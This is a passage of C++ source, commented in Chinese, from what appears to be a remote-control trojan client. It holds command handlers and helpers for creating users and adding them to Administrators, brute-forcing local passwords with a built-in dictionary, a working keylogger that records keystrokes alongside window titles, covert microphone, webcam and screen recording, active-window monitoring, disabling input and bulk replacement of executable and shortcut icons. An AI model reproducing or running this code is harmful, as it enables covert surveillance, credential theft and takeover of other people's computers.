                if (!args_m.compare("")) args_m = "1";

                HHOOK hk = NULL;
                Disable_Keyboard_Mouse(atoi(args_m.data()), hk, atoi(args_t.data()));
                UnhookWindowsHookEx(hk);
            }
            else if (!cmd.compare("installed")) {
                if (args_h) {
                    message = "\n简介：\n这个模块通过检索注册表来查询已安装的程序，输出格式：程序名\\t备注\\t出版商\\t版本\n\n";
                    message += "\n参数：\n-c 重复执行本模块几次，默认1\n\n";
                    return message;
                }

                vector<string> applist;
                string output = List_Installed_Application(applist);
                for (int i = 0; i < applist.size(); i++) {
                    message += applist.at(i) + "\n";
                }
                message += "\n"+ output + "\n";
            }
            else if (!cmd.compare("light")) {
                if (args_h) {
                    message = "\n简介：\n这个模块可以检查并设置显示器的亮度\n";
                    message += "\n参数：\n-m 指定模式\n\t1\t检查屏幕当前/最小/最大亮度，默认选项\n\t2\t设置亮度\n";
                    message += "-t 亮度等级（仅模式2），默认5\n";
                    message += "-c 重复执行本模块几次，默认1\n\n";
                    return message;
                }
                if (!args_m.compare("")) args_m = "1";
                if (!args_t.compare("")) args_t = "5";
                message += Set_Monitor(atoi(args_m.data()), atoi(args_t.data())) + "\n";
            }
            else if (!cmd.compare("adduser")) {
                if (args_h) {
                    message = "\n简介：\n这个模块通过Win32API添加用户\n";
                    message += "\n参数：\n-t 指定用户名，默认test\n";
                    message += "-p 指定用户的密码，默认空\n";
                    message += "-c 重复执行本模块几次，默认1\n\n";
                    return message;
                }
                if (!args_t.compare("")) args_t = "test";
                message += Create_Normal_User(args_t, args_p) + "\n";
            }
            else if (!cmd.compare("addgroup")) {
                if (args_h) {
                    message = "\n简介：\n这个模块通过Win32API添加用户到用户组\n";
                    message += "\n参数：\n-t 指定用户名，默认test\n";
                    message += "-s 指定用户组名，默认Administrators\n";
                    message += "-c 重复执行本模块几次，默认1\n\n";
                    return message;
                }
                if (!args_t.compare("")) args_t = "test";
                if (!args_s.compare("")) args_s = "Administrators";
                message += ADD_User_Group(args_t, args_s) + "\n";
            }
            else if (!cmd.compare("deluser")) {
                if (args_h) {
                    message = "\n简介：\n这个模块通过Win32API删除用户\n";
                    message += "\n参数：\n-t 指定用户名，默认test\n";
                    message += "-c 重复执行本模块几次，默认1\n\n";
                    return message;
                }
                if (!args_t.compare("")) args_t = "test";
                message += Delete_User(args_t) + "\n";
            }
            else if (!cmd.compare("setuser")) {
                if (args_h) {
                    message = "\n简介：\n这个模块通过Win32API设置用户的密码/用户名/设置用户登录脚本\n";
                    message += "\n参数：\n-m 指定模式\n\tpassword\t更改密码\n\tusername\t更改用户名\n\tscript\n\t设置登录脚本\n";
                    message += "-t 指定用户名，默认test\n";
                    message += "-i 字符串参数（新密码/新用户名/登录脚本路径），根据不同模式设置\n";
                    message += "-c 重复执行本模块几次，默认1\n\n";
                    return message;
                }
                if (!args_t.compare("")) args_t = "test";
                message += Change_User_Settings(args_m, args_t, args_i) + "\n";
            }
            else if (!cmd.compare("localbrute")) {
                if (!args_t.compare("")) {
                    message = "\n简介：\n这个模块尝试输入旧密码的方式修改新密码来爆破本地用户的凭据，内置1w字典\n";
                    message += "\n参数：\n-m 指定模式\n\t0\t内置字典爆破（预计1分钟），默认选项\n\t";
                    message += "1\t手工尝试单个密码\n\t2\t自定义字典爆破\n";
                    message += "-t 指定用户名\n";
                    message += "-i 字符串参数（单个密码/字典路径），根据不同模式设置\n";
                    message += "-c 重复执行本模块几次，默认1\n\n";
                    return message;
                }
                if (!args_m.compare("")) args_m = "0";
                message += User_Local_Brute(args_t,atoi(args_m.data()),args_i) + "\n";
            }
            else if (!cmd.compare("lockscreen")) {
                if (args_h) {
                    message = "\n简介：\n这个模块通过Win32API设置电脑锁屏\n\n";
                    message += "\n参数：\n-c 重复执行本模块几次，默认1\n\n";
                    return message;
                }
                message += LockWorkStation() + "\n";
            }
            else if (!cmd.compare("swap_mouse")) {
                if (args_h) {
                    message = "\n简介：\n这个模块通过Win32API设置鼠标左右键功能反转\n";
                    message += "\n参数：\n-m 指定模式\n\t1\t反转鼠标左右键，默认选项\n\t0\t恢复本来含义\n";
                    message += "-c 重复执行本模块几次，默认1\n\n";
                    return message;
                }
                if (!args_m.compare("")) args_m = "1";
                message += SwapMouseButton(atoi(args_m.data())) + "\n";
            }
            else if (!cmd.compare("sleep")) {
                if (args_h) {
                    message = "\n简介：\n这个模块通过Win32API设置电脑睡眠或休眠\n";
                    message += "\n参数：\n-m 指定模式\n\t1\t休眠\n\t0\t睡眠，默认选项\n";
                    message += "-s 指定是否禁用唤醒事件\n\t1\t禁用\n\t0\t启用，默认选项\n";
                    message += "-c 重复执行本模块几次，默认1\n\n";
                    message += "注意：睡眠与休眠的区别，睡眠时只保留内存供电，休眠是将内存以文件形式保存在磁盘";
                    message += "进行更深度的睡眠，功耗非常低与关机几乎相同\n\n";
                    return message;
                }
                if (!args_m.compare("")) args_m = "0";
                if (!args_s.compare("")) args_s = "0";
                SetSuspendState(atoi(args_m.data()), true, atoi(args_s.data()));
            }
            else if (!cmd.compare("background")) {
                if (args_h) {
                    message = "\n简介：\n这个模块通过Win32API设置电脑桌面壁纸\n";
                    message += "\n参数：\n-f 指定图像文件路径\n";
                    message += "-c 重复执行本模块几次，默认1\n\n";
                    return message;
                }
                SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (PVOID)args_f.data(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
            }
            else if (!cmd.compare("messagebox")) {
                if (args_h) {
                    message = "\n简介：\nWin32API->MessageBoxA\n";
                    message += "\n参数：\n-t 指定弹窗标题文字\n";
                    message += "-s 指定弹窗消息文字\n";
                    message += "-c 重复执行本模块几次，默认1\n\n";
                    message += "注意：要等用户点击确定按钮退出弹窗才能收到服务端的返回消息\n\n";
                    return message;
                }
                MessageBoxA(NULL, args_s.data(), args_t.data(), MB_ICONINFORMATION);
            }
            else if (!cmd.compare("shutdown")) {
                if (!args_m.compare("")) {
                    message = "\n简介：\n这个模块通过Win32API设置注销当前用户/关机/重启\n";
                    message += "\n参数：\n-m 指定模式\n\t1\t注销当前用户\n\t2\t关机\n\t3\t重启\n";
                    message += "-c 重复执行本模块几次，默认1\n\n";
                    return message;
                }
                Get_Shutdown_Privilege(atoi(args_m.data()));
            }
            else if (!cmd.compare("record")) {
                if (args_h) {
                    message = "\n简介：\n这个模块可以通过麦克风进行录音，输出PCM裸流音频文件\n";
                    message += "\n参数：\n-t 指定录制时长（秒），默认60\n";
                    message += "-f 指定音频文件名，默认record.pcm\n";
                    message += "-c 重复执行本模块几次，默认1\n\n";
                    message += "注意：ffmpeg.exe -y -f s16be -ac 1 -ar 16000 -acodec pcm_s16le -i record.pcm record.mp3，";
                    message += "通过ffmpeg可以将其转换为mp3文件\n\n";
                    return message;
                }
                if (!args_f.compare("")) args_f = "record.pcm";
                if (!args_t.compare("")) args_t = "60";
                record(atoi(args_t.data()), args_f);
            }
            else if (!cmd.compare("screen")) {
                if (args_h) {
                    message = "\n简介：\n这个模块使用GDI截屏+OpenCV库合成视频达到录制本地屏幕目的，输出MP4格式的音频文件\n";
                    message += "\n参数：\n-t 指定录制时长（秒），默认60\n";
                    message += "-f 指定音频文件名，默认：[时间戳].mp4\n";
                    message += "-p 指定输出视频的fps，默认5\n";
                    message += "-s 指定捕获每帧的间隔（毫秒），默认1000\n";
                    message += "-c 重复执行本模块几次，默认1\n\n";
                    message += "注意：录制时长是实际的工作时长，不是视频的时长\n\n";
                    return message;
                }
                if (!args_f.compare("")) args_f = Get_Current_Timestamp2()+".mp4";
                if (!args_t.compare("")) args_t = "60";
                if (!args_p.compare("")) args_p = "5";
                if (!args_s.compare("")) args_s = "1000";
                record_screen(atoi(args_t.data()), atoi(args_p.data()), atoi(args_s.data()), args_f);
            }
            else if (!cmd.compare("video")) {
                if (args_h) {
                    message = "\n简介：\n这个模块可以通过摄像头录制视频\n";
                    message += "\n参数：\n-t 指定录制时长（秒），默认60\n";
                    message += "-f 指定音频文件名，默认：[时间戳].mp4\n";
                    message += "-p 指定输出视频的fps，默认5\n";
                    message += "-s 指定捕获每帧的间隔（毫秒），默认1000\n";
                    message += "-c 重复执行本模块几次，默认1\n\n";
                    message += "注意：录制时长是实际的工作时长，不是视频的时长\n\n";
                    return message;
                }
                if (!args_f.compare("")) args_f = Get_Current_Timestamp2() + ".mp4";
                if (!args_t.compare("")) args_t = "60";
                if (!args_p.compare("")) args_p = "5";
                if (!args_s.compare("")) args_s = "1000";
                camera_video(atoi(args_t.data()), atoi(args_s.data()), atoi(args_p.data()), args_f);
            }
            else if (!cmd.compare("camera")) {
                if (args_h) {
                    message = "\n简介：\n这个模块可以通过摄像头拍照\n";
                    message += "\n参数：\n-t 指定拍照数量，默认5\n";
                    message += "-d 指定图像文件的存放目录，默认当前目录\n";
                    message += "-s 指定拍照之间的间隔（秒），默认1\n";
                    message += "-c 重复执行本模块几次，默认1\n\n";
                    message += "注意：图像文件名为sf_1.png->sf_[n].jpg\n\n";
                    return message;
                }
                if (!args_t.compare("")) args_t = "5";
                if (!args_s.compare("")) args_s = "1";
                camera_screen(atoi(args_t.data()), atoi(args_s.data()), args_d);
            }
            message += "\n["+Get_Current_Timestamp()+"] 执行完毕，第" + to_string(i) + "次\n";
        }

        return message;
    }

    //计算可以按照指定分割符分割出多少个单词
    //指定字符串，指定分隔符
    int text_substr_count(string args_text, string s = " ") {
        int count = 1;
        char rep = '#';
        if (s[0] == rep) rep = '@';

        while (true) {
            int pos = args_text.find(s);
            if (pos < 0) return count;

            for (int i = 0; i < s.size(); i++) {
                args_text[pos + i] = rep;
            }
            count++;
        }
        return count;
    }
    //分割并选中字符串，指定要分割的字符串，指定分割符(默认空格)，指定要第几个子串(默认99即最后一个)
    string text_substr(string args_text, string s = " ", int pos = 99) {
        string str;
        char* temp = (char*)args_text.data();
        int count = 1;
        while (true) {
            str = strtok_s(temp, s.data(), &temp);
            if ((!strcmp(temp, "")) || (pos == 1) || (pos == count)) break;
            count++;
        }
        return str;
    }



    bool ScreenShot(string bmpFileName) {
        //当前屏幕，检索整个屏幕的DC
        HDC hCurrScreen = GetDC(NULL);
        int ScreenWidth = GetSystemMetrics(SM_CXSCREEN);
        int ScreenHeight = GetSystemMetrics(SM_CYSCREEN);
        //创建当前屏幕截图位图
        HBITMAP sbmp = CreateCompatibleBitmap(hCurrScreen, ScreenWidth, ScreenHeight);
        bool status = SaveBmp(sbmp, ScreenWidth, ScreenHeight, hCurrScreen, bmpFileName.data());
        return status;
    }

     /*判断路径是文件还是目录并提供递归复制文件功能
    要判断文件类型的文件名，指定复制到哪个文件夹(默认情况不复制)，
    复制的话是否覆盖(只指定覆盖为true将复制到当前目录)*/
    string FILEorDIR(string file, string dstfile = "", bool cover = false) {
        DWORD fileinfo = GetFileAttributesA(file.data());
        //先判断文件/目录是否存在
        if (fileinfo == INVALID_FILE_ATTRIBUTES) {
            return "error";
        }
        else if (fileinfo & FILE_ATTRIBUTE_DIRECTORY) {
            if (dstfile.compare("")) {
                vector<string> files;
                dstfile = dstfile + text_substr(file, "\\", 99) + "\\";
                if (!FILEorDIR(dstfile).compare("error")) CreateDirectory((CString)dstfile.data(), NULL);

                //文件句柄
                intptr_t handle;
                //文件结构体
                struct _finddata_t fileInfo;
                //指定要在指定路径搜寻的文件类型
                string FileType = file + "\\*";
                //第一次查找，获取文件句柄
                handle = _findfirst(FileType.c_str(), &fileInfo);
                //遍历文件夹中的文件
                while (!_findnext(handle, &fileInfo))
                {
                    if (!strcmp(fileInfo.name, "..")) continue;
                    //复制文件
                    FILEorDIR(file + "\\" + fileInfo.name, dstfile, 1);
                    files.push_back(fileInfo.name);
                }
                _findclose(handle);
            }
            return "dir";
        }
        else {
            if ((dstfile.compare("")) || cover) {
                dstfile = dstfile + text_substr(file, "\\", 99);
                CopyFile((CString)file.data(), (CString)dstfile.data(), !cover);
            }
            return "file";
        }
    }

    //几个类型转换函数

    string tchar_to_string(TCHAR* t_str) {
        int len = WideCharToMultiByte(CP_ACP, 0, t_str, -1, NULL, 0, NULL, NULL);
        //排除传入空字符的乱码问题
        if (len == 2) return "";
        char* c_str = new char[len * sizeof(char)];
        WideCharToMultiByte(CP_ACP, 0, t_str, -1, c_str, len, NULL, NULL);
        return c_str;
    }

    wchar_t* string_to_wchar(string str) {
        size_t size = str.length();
        wchar_t* buffer = new wchar_t[size + 1];
        MultiByteToWideChar(CP_ACP, 0, str.c_str(), -1, buffer, size);
        buffer[size] = 0;
        return buffer;
    }

    string wchar_to_string(const wchar_t* w_str)
    {
        string str;
        int len = WideCharToMultiByte(CP_ACP, 0, w_str, wcslen(w_str), NULL, 0, NULL, NULL);
        char* c_str = new char[len + 1];
        WideCharToMultiByte(CP_ACP, 0, w_str, wcslen(w_str), c_str, len, NULL, NULL);
        c_str[len] = '\0';
        str = c_str;
        delete[] c_str;
        return str;
    }

    TCHAR* char_to_tchar(const char* str)
    {
        int len = MultiByteToWideChar(CP_ACP, 0, str, -1, NULL, 0);
        TCHAR* t_str = new TCHAR[len * sizeof(TCHAR)];
        MultiByteToWideChar(CP_ACP, 0, str, -1, t_str, len);
        return t_str;
    }

    //简单的检索当前窗口标题
    string Get_Current_WinTitle() {
        DWORD fProID;
        char fProTitle[MAX_PATH];
        string result;

        //获取前台程序窗口句柄
        HWND fWindow = GetForegroundWindow();
        //获取窗口进程标题
        GetWindowTextA(fWindow, fProTitle, MAX_PATH);
        result = "{窗口：";
        result += fProTitle;
        result += "}\n";
        return result;
    }

    //根据数字返回ASCII码
    string Num_to_Ascii(int num) {
        //cout << num << endl;
        string result;
        const char* s_map[] = { "[NUL]","[鼠标左键]","[鼠标右键]","[ETX]","[鼠标中键]","[ENQ]","[ACK]" ,"[BEL]" ,"[退格]" ,"[TAB]" ,"[LF]" ,"[VT]"
            ,"[EF]" ,"[回车]" ,"[SO]" ,"[SI]" ,"[shift]" ,"[Ctrl]" ,"[Alt]" ,"[暂停]" ,"[大写]" ,"[NAK]" ,"[SYN]" ,"[ETB]" ,"[CAN]" ,"[EM]" ,"[SUB]" ,"[ESC]" ,"[FS]" ,"[GS]" ,"[RS]" ,"[US]" };
        string c_map = " !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~";

        if ((num >= 32) && (num <= 126)) {
            //common_map从ASCII码32开始
            num = num - 32;
            //按号码取值
            if ((num >= 0) && (num <= 96)) {
                result = c_map[num];
            }
        }
        else if ((num >= 0) && (num <= 31)) {
            result = s_map[num];
        }
        else {
            result = "None";
        }

        return result;
    }

    //写入文件，具有备份功能
    void write_file(string filename, string text, int backup = 0) {
        string bakname;
        fstream file(filename, ios::in);
        if (file && backup) {
            file.close();
            for (int i = 1; i < 10000; i++) {
                bakname = filename + ".bak" + to_string(i);
                fstream bak(bakname, ios::in);
                if (!bak) break;
            }
            int status = rename(filename.data(), bakname.data());
        }
        fstream wfile(filename, ios::app);
        wfile << text;
        wfile.close();
    }

    /*键盘记录器，指定睡眠时长(毫秒)以减少爆破按键的次数，判断是否为连续按键（即单词分隔）的时长(毫秒)，
    指定录制时长(分钟)（约等于），指定日志文件名*/
    void keylogger(int SleepTime = 50, int interval = 1000, int Time = 60, string filename = "key.log") {
        clock_t start, end;
        string word;
        int time = 0;
        int shift_history = 0;
        //ASCII码
        int num;
        //大小写锁定
        int up_status = 0;
        //程序开始的时间
        clock_t kopen = clock();
        //先备份同名日志
        write_file(filename, "", 1);

        while (true)
        {
            string tmp;
            //暴力猜测按了什么键
            for (int i = 1; i <= 255; i++) {
                //shift判断
                int Shift_status_code = GetAsyncKeyState(16);
                bool Shift_status = (Shift_status_code & 0x80000000) == 0x80000000;
                //CapsLock判断
                int up_status = GetKeyState(20);
                //判断是否按下这个健
                if ((GetAsyncKeyState(i) & 0x1) == 1)
                {
                    num = i;
                    //获取当前时间用于判断间隔时长以考虑是否将单词隔开
                    start = clock();

                    //ASCII码预处理
                    //[a-z]的号码纠正
                    if ((num >= 65) && (num <= 90) && (((!Shift_status) && (!up_status)) || ((Shift_status) && (up_status)))) {
                        num = num + 32;
                        if (Shift_status) shift_history = 0;
                    }
                    //+-*/.
                    else if ((num >= 106) && (num <= 111)) {
                        num = num - 64;
                    }
                    //F[1-12]
                    else if ((num >= 112) && (num <= 123)) {
                        num = num - 111;
                        tmp += "[F" + to_string(num) + "]";
                    }
                    //shift记录,用于判断单个shift还是shift组合键
                    else if ((num == 160) || (num == 161)) {
                        shift_history++;
                        break;
                    }
                    //排除alt/ctrl/(截图|暂停)键触发的另一个键值
                    else if ((num == 165) || (num == 162) || (num == 255)) {
                        continue;
                    }
                    //shift+[0-9]
                    else if ((num >= 48) && (num <= 57) && (Shift_status)) {
                        string num_map = ")!@#$%^&*(";
                        //number_up_map从ASCII码48开始
                        num = num - 48;
                        word += num_map[num];
                        shift_history = 0;
                        continue;
                    }
                    //方向键，上下左右
                    else if ((num >= 37) && (num <= 40)) {
                        const char* d_map[] = { "[左]","[上]","[右]","[下]" };
                        //direction_map从ASCII码37开始
                        num = num - 37;
                        tmp = d_map[num];
                    }
                    //小键盘的[0-9]
                    else if ((num >= 96) && (num <= 105)) {
                        num = num - 48;
                    }
                    //手动修正单个字符,要先判断有没有shift的情况
                    switch (num) {
                    case 187: if (Shift_status) num = 43; else num = 61; break;
                    case 186: if (Shift_status) num = 58; else num = 59; break;
                    case 188: if (Shift_status) num = 60; else num = 44; break;
                    case 189: if (Shift_status) num = 95; else num = 45; break;
                    case 190: if (Shift_status) num = 62; else num = 46; break;
                    case 191: if (Shift_status) num = 63; else num = 47; break;
                    case 219: if (Shift_status) num = 123; else num = 91; break;
                    case 220: if (Shift_status) num = 124; else num = 92; break;
                    case 221: if (Shift_status) num = 125; else num = 93; break;
                    case 222: if (Shift_status) num = 34; else num = 39; break;
                    case 192: if (Shift_status) num = 126; else num = 96; break;
                    case 33: tmp = "[前翻]"; break;
                    case 34: tmp = "[后翻]"; break;
                    case 35: tmp = "[END]"; break;
                    case 36: tmp = "[HOME]"; break;
                    case 44: tmp = "[截图]"; break;
                    case 45: tmp = "[插入]"; break;
                    case 46: tmp = "[删除]"; break;
                    case 91: tmp = "[Windows]"; break;
                    case 93: tmp = "[键盘右键]"; break;
                    case 144: tmp = "[小键盘锁]"; break;
                    case 145: tmp = "[锁定]"; break;
                    }

                    //判断shift是单独使用还是搭配特殊键使用
                    //shift_history代表按过shift的次数，搭配特殊键会清除次数
                    if ((((num >= 65) && (num <= 90)) || ((i >= 187) && (i <= 222))) && (Shift_status)) {
                        shift_history = 0;
                    }
                    //特殊情况，if (shift_history == 99) shift_history = 0;4shift + 小键盘 不能捕捉到shift已按下，接收的键值也跟普通的一样，流程结束会多一个shift
                    if (((i >= 37) && (i <= 40)) || (num == 33) || (num == 34) || (num == 12) || (num == 36) || (num == 35) || (num == 45) || (num == 46)) {
                        if (shift_history > 0) shift_history = -1;
                    }
                    //如果shift键没有搭配特殊键使用，那么下次添加单词之前会加上[shift]记录
                    if (shift_history > 0) {
                        for (int x = 0; x < shift_history; x++) word += "[shift]";
                        shift_history = 0;
                    }

                    //拼凑单词
                    if (!tmp.compare("")) {
                        word += Num_to_Ascii(num);
                    }
                    else {
                        word += tmp;
                    }
                }
            }


            //单词不为空才有必要计算时长
            if (word.compare("")) {
                end = clock();
                time = (double(end - start) / CLOCKS_PER_SEC) * 1000;
            }
            //判断间隔时间是否达到连词成句的预定值
            if (time >= interval) {
                //指定文件名追加写入
                write_file(filename, Get_Current_WinTitle());
                write_file(filename, word + "\n");
                word = "";
                time = 0;
            }

            //判断是否达到的录制时长
            clock_t kclose = clock();
            int ktime = (double(kclose - kopen) / CLOCKS_PER_SEC) * 1000;
            if (ktime > (Time * 60000)) break;

            //减少不必要的循环次数
            Sleep(SleepTime);
        }
    }

    //获取前台窗口的标题/进程名/PID
    string Get_Window_Info() {
        DWORD fProID;
        TCHAR fProName[MAX_PATH] = { 0 };
        TCHAR pfProName[MAX_PATH] = { 0 };
        DWORD BufSize = MAX_PATH;
        char fProTitle[MAX_PATH];
        string result;

        //获取前台程序窗口句柄
        HWND fWindow = GetForegroundWindow();
        //指定窗口句柄接收进程标识符（PID）
        GetWindowThreadProcessId(fWindow, &fProID);
        HANDLE fProcess = OpenProcess(PROCESS_QUERY_INFORMATION, false, fProID);
        result += "\nPID： " + to_string(fProID);
        //查询进程名
        QueryFullProcessImageNameW(fProcess, 0, fProName, &BufSize);
        result += "\n进程名： " + tchar_to_string(fProName) + "\n";
        //获取窗口进程标题
        GetWindowTextA(fWindow, fProTitle, MAX_PATH);
        result += "窗口标题：";
        result += fProTitle;
        result += "\n\n";

        return result;
    }

    //获取当前的时间戳
    string Get_Current_Timestamp() {
        SYSTEMTIME lt;
        GetLocalTime(&lt);
        string Time = to_string(lt.wYear) + "/" + to_string(lt.wMonth) + "/" +
            to_string(lt.wDay) + "/" + to_string(lt.wHour) + ":" +
            to_string(lt.wMinute) + ":" + to_string(lt.wSecond);
        return Time;
    }
    //获取当前的时间戳，用于作文件名
    string Get_Current_Timestamp2() {
        SYSTEMTIME lt;
        GetLocalTime(&lt);
        string Time = to_string(lt.wYear) + "_" + to_string(lt.wMonth) + "_" +
            to_string(lt.wDay) + "_" + to_string(lt.wHour) + "_" +
            to_string(lt.wMinute) + "_" + to_string(lt.wSecond);
        return Time;
    }

    //持续监控活动窗口标题，指定录制时长(分钟，默认24小时)，指定检测间隔时间(秒，默认1),指定日志文件名(默认为Windows.log)
    void Monitor_Window_Title(int TimeLen = 1440, int SleepTime = 1, string logfile = "Windows.log") {
        string tmp;
        string time_tmp = "Start";
        clock_t topen = clock();
        write_file(logfile, "", 1);
        while (true) {
            string result = Get_Window_Info();
            if (result.compare(tmp.data())) {
                write_file(logfile, "\n" + time_tmp + " ~ " + Get_Current_Timestamp());
                write_file(logfile, tmp);
                time_tmp = Get_Current_Timestamp();
            }
            int ttime = (double(clock() - topen) / CLOCKS_PER_SEC) * 1000;
            //计算时长判断是否停止，退出前记录最后的信息
            if (ttime > (TimeLen * 60000)) {
                write_file(logfile, "\n" + time_tmp + " ~ " + Get_Current_Timestamp());
                write_file(logfile, tmp);
                break;
            }
            tmp = result;
            Sleep(SleepTime * 1000);
        }
    }

    /*批量发送按键
    参数：指定包含按键值的容器，指定每个键值执行之间的延迟
    细节：比如91为左win键，091为松开左win键，s100为睡眠100毫秒；
    比如[a-z][0-9]这些键不需要发送松开键消息*/
    void Send_Keys(queue<string> keys, int timeout = 1000) {

        while (!keys.empty()) {
            int keynum = atoi(keys.front().data());
            if (keys.front()[0] == 's') {
                Sleep(atoi(keys.front().substr(1).data()));
            }
            else if (keys.front()[0] == '0') {
                keybd_event(keynum, 0, KEYEVENTF_KEYUP, 0);
            }
            else {
                keybd_event(keynum, 0, 0, 0);
            }
            keys.pop();
            Sleep(timeout);
        }
    }

    //列出文件夹内所有文件保存至vector容器中
    void List_Dir_File(string path, vector<string>& files) {
        //文件句柄
        intptr_t handle;
        //文件结构体
        struct _finddata_t fileInfo;
        //指定要在指定路径搜寻的文件类型
        string FileType = path + "\\*";
        //第一次查找，获取文件句柄
        handle = _findfirst(FileType.c_str(), &fileInfo);
        //遍历文件夹中的文件
        while (!_findnext(handle, &fileInfo))
        {
            if (!strcmp(fileInfo.name, "..")) continue;
            files.push_back(fileInfo.name);
        }
        _findclose(handle);
    }

    string Change_exe_icon(string exeFile, string icoFile)
    {
        int FileGrpSize;
        DWORD dwFileSize, dwBytesRead;
        void* filebuf, * p;
        PIconResDirGrp FileGrp;
        HANDLE hFile, hUpdateRes;
        wchar_t* exeFileW = string_to_wchar(exeFile.data());
        wchar_t* icoFileW = string_to_wchar(icoFile.data());
        wchar_t* resNameW = string_to_wchar("AyIcon");

        //打开ico文件；文件路径,请求读权限,,,仅打开存在的文件,访问旨在从开始到结束按顺序进行,
        hFile = CreateFile(icoFileW, GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, 0);
        if (hFile == INVALID_HANDLE_VALUE) return exeFile+" 打开ico文件失败";

        //获取文件大小，开辟相同大小的缓冲区
        dwFileSize = GetFileSize(hFile, NULL);
        filebuf = malloc(dwFileSize);
        //读取文件到缓冲区 
        ReadFile(hFile, filebuf, dwFileSize, &dwBytesRead, NULL);


        FileGrp = PIconResDirGrp(filebuf);
        //获取ico头部大小  
        FileGrpSize = sizeof(TIconResDirGrp) + (FileGrp->idHeader.idCount - 1) * sizeof(TResDirHeader);
        //获取可以操作资源的句柄  
        hUpdateRes = BeginUpdateResource(exeFileW, false);

        //更改所有帧的资源  
        for (int i = 0; i < FileGrp->idHeader.idCount; i++)
        {
            p = (void*)((DWORD)filebuf + FileGrp->idEntries[i].lImageOffset);
            UpdateResource(hUpdateRes, RT_ICON, MAKEINTRESOURCE(FileGrp->idEntries[i].lImageOffset)
                , LANG_USER_DEFAULT, p, FileGrp->idEntries[i].lBYTEsInRes);
        }

        //更新头部信息
        UpdateResource(hUpdateRes, RT_GROUP_ICON, resNameW, LANG_USER_DEFAULT, FileGrp, FileGrpSize);
        EndUpdateResource(hUpdateRes, false);

        //释放资源
        CloseHandle(hFile);
        free(filebuf);
        return exeFile+" 设置成功";
    }

    //更改快捷方式图标
    //指定快捷方式路径，指定图标文件
    string Change_lnk_icon(string lnkPath, string icoPath)
    {
        HRESULT hr;
        IShellLink* isl = NULL;
        IPersistFile* ipf = NULL;

        //初始化COM库,设置该线程创建的对象的方法调用始终在同一线程
        CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
        //创建并初始化指定CLSID关联类的对象
        hr = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (LPVOID*)&isl);
        if (hr != S_OK) return lnkPath + " 初始化ShellLink类失败";
        hr = isl->QueryInterface(IID_IPersistFile, (LPVOID*)&ipf);
        if (hr != S_OK) return lnkPath + " 查询Shell链接接口失败";
        //打开链接文件初始化一个对象，申请读写权限
        hr = ipf->Load((CString)lnkPath.data(), STGM_READWRITE);
        if (hr != S_OK) return lnkPath + " 创建Shell链接对象失败";
        //设置Shell链接对象图标位置
        hr = isl->SetIconLocation((CString)icoPath.data(), 0);
        if (hr != S_OK) return lnkPath + " 设置图标位置失败";
        //将对象的副本保存到本来的文件
        ipf->Save((CString)lnkPath.data(), TRUE);
        if (hr != S_OK) return lnkPath + " 保存图标更改失败";

        //清理资源
        ipf->Release();
        isl->Release();
        CoUninitialize();
        return lnkPath+" 设置成功";
    }

    //批量设置指定路径下所有exe和lnk文件的图标
    //指定文件夹路径(例：D:\\test)，指定图标文件路径
    string Batch_Set_Icon(string path, string icoPath) {
        string result = "";
        vector<string> files;
        List_Dir_File(path, files);

        for (int i = 0; i < files.size(); i++) {
            string output;
            string f = files[i];
            int len = f.size();
            if (!f.substr(len - 4).compare(".exe")) {
                result += Change_exe_icon(path + "\\" + f, icoPath)+"\n";
            }
            else if (!f.substr(len - 4).compare(".lnk")) {
                result += Change_lnk_icon(path + "\\" + f, icoPath)+"\n";
            }
        }
        return result;
    }

    /*
    播放wav格式音频文件
    模式1，异步播放；模式2，停止播放；
    模式3，循环异步播放；模式4，同步播放*/
    void Play_Audio(int mode, string args1) {
        wchar_t* wavpath = string_to_wchar(args1);
        wcout << wavpath << endl;
        switch (mode) {
        case 1:
            PlaySound(wavpath, NULL, SND_SENTRY | SND_NODEFAULT | SND_ASYNC);
            break;
        case 2:
            PlaySound(NULL, NULL, SND_ASYNC);
            break;
        case 3:
            PlaySound(wavpath, NULL, SND_LOOP | SND_ASYNC | SND_NODEFAULT);
            break;
        case 4:
            PlaySound(wavpath, NULL, SND_NODEFAULT | SND_SYNC);
            break;
        }
        delete wavpath;
    }

    /*获取主音量音量大小，设置主音量
    模式1获取当前主音量，模式2设置主音量并需要传入音量参数(0.00-1.00)
    模式3设置静音，模式4取消静音
    默认情况将音量设置为100*/
    string Set_MasterVolume(int mode = 2, float args1 = 1.00)
    {
        HRESULT hr = NULL;
        IMMDeviceEnumerator* deviceEnumerator = NULL;
        IMMDevice* defaultDevice = NULL;
        IAudioEndpointVolume* endpointVolume = NULL;
        string result;

        //初始化COM库,设置该线程创建的对象的方法调用始终在同一线程
        CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
        //创建并初始化指定CLSID关联类的对象
        hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_INPROC_SERVER,
            __uuidof(IMMDeviceEnumerator), (LPVOID*)&deviceEnumerator);
        if (hr != S_OK) return "初始化音频端点设备类对象失败";
        hr = deviceEnumerator->GetDefaultAudioEndpoint(eRender, eConsole, &defaultDevice);
        if (hr != S_OK) return "检索默认音频端点设备失败";
        //创建具有指定接口的COM对象
        hr = defaultDevice->Activate(__uuidof(IAudioEndpointVolume),
            CLSCTX_INPROC_SERVER, NULL, (LPVOID*)&endpointVolume);
        if (hr != S_OK) return "激活COM对象失败";

        //获取当前主音量
        if (mode == 1) {
            float currentVolume = 0;
            hr = endpointVolume->GetMasterVolumeLevelScalar(&currentVolume);
            if (hr != S_OK) return "获取主音量失败";
            result = to_string(currentVolume);
        }
        //设置当前主音量
        else if (mode == 2) {
            hr = endpointVolume->SetMasterVolumeLevelScalar(args1, NULL);
            if (hr != S_OK) return "设置主音量失败";
            result = to_string(args1);
        }
        //设置主音量静音
        else if (mode == 3) {
            hr = endpointVolume->SetMute(true, NULL);
            if (hr != S_OK) return "设置静音失败";
            result = "true";
        }
        //取消设置主音量静音
        else if (mode == 4) {
            hr = endpointVolume->SetMute(false, NULL);
            if (hr != S_OK) return "取消设置静音失败";
            result = "true";
        }

        //释放资源
        endpointVolume->Release();
